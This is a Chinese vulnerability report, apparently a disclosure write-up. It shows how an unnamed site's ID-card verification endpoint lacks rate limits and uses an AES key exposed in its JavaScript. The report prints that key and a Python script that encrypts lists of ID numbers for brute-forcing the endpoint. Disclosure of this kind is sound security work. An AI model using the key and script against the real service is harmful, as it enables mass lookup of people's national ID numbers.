---
title: XXX严重配置错误导致非法获取他人身份证
slug: "0117"
---
# **XXX严重配置错误导致非法获取他人身份证**

**1.漏洞详情**

**在对XXX进行安全测试时，发现其存在验证认证配置错误，导致能够对他人身份证进行爆破，且由于身份证认证需要消耗金额，危害十分严重，建议立即修复！**



**2.漏洞证明**

**申明：本测试使用的是自己的身份证，没有进行任何非法查询！**

**点击编辑,点击添加其他曲作者输入身份证，点击提交抓包**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779789200254-1ec451d7-371e-448c-85bb-e3294f57a154.png)**

**发现如下实名认证数据包没有任何查询数量限制！但是 idCode 是加密的**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779789257455-118a82fd-dae4-4bdd-8522-787966813d40.png)**

**在 js 里面找到了密钥 E4947EA23DD02886**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779789281444-ed1230b3-e0d7-4a47-a69f-0378b970972e.png)**

**解密后发现完全一致，AES 对称加密**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779789394775-01350f6c-2635-47ee-b89c-6edd1fe31374.png)**

**于是可以利用脚本对身份证进行爆破，脚本如下：**

```PYT
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

def aes_encrypt(plaintext, key):
    """
    AES-128-ECB 加密，使用 PKCS7 填充
    :param plaintext: 明文字符串
    :param key: 密钥字符串（需为16字节）
    :return: Base64 编码的密文
    """
    key_bytes = key.encode('utf-8')
    plaintext_bytes = plaintext.encode('utf-8')
    
    cipher = AES.new(key_bytes, AES.MODE_ECB)
    padded_data = pad(plaintext_bytes, AES.block_size)
    ciphertext_bytes = cipher.encrypt(padded_data)
    
    ciphertext_base64 = base64.b64encode(ciphertext_bytes).decode('utf-8')
    return ciphertext_base64


# ==========================================
#           配置参数
# ==========================================
KEY = "E4947EA23DD02886"  # 确保密钥是16字节 (AES-128)
INPUT_FILE = "D:\\desk\\temp\\out.txt"      # 输入：每行一个身份证号
OUTPUT_FILE = "D:\\desk\\temp\\outcome1.txt" # 输出：每行一个加密后的Base64密文


# ==========================================
#           批量处理
# ==========================================
def batch_encrypt():
    try:
        with open(INPUT_FILE, 'r', encoding='utf-8') as f_in:
            id_cards = [line.strip() for line in f_in if line.strip()]
        
        encrypted_results = []
        for id_card in id_cards:
            try:
                encrypted = aes_encrypt(id_card, KEY)
                encrypted_results.append(encrypted)
                print(f"加密成功: {id_card} -> {encrypted}")
            except Exception as e:
                print(f"加密失败 (身份证: {id_card}): {str(e)}")
                encrypted_results.append("")  # 占位符
        
        with open(OUTPUT_FILE, 'w', encoding='utf-8') as f_out:
            for result in encrypted_results:
                f_out.write(result + "\n")
        
        print(f"\n✅ 批量加密完成！结果已保存到: {OUTPUT_FILE}")
    
    except FileNotFoundError:
        print(f"❌ 错误：找不到文件 {INPUT_FILE}，请确保文件存在。")
    except Exception as e:
        print(f"❌ 执行出错: {str(e)}")


# 运行批量加密
if __name__ == "__main__":
    batch_encrypt()
```



**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779789442302-3ccd7edd-2450-4c61-abb5-38e1cfb7f83d.png)**

**爆破**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779789477036-e3924a3c-145e-4186-8f37-42d16e838c9a.png)**

**成功得到自己的身份证**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779789515858-fdc573d1-c305-4f50-83c5-3d91c8581611.png)**



**3.修复方案**

**请立即限制该接口的数量**
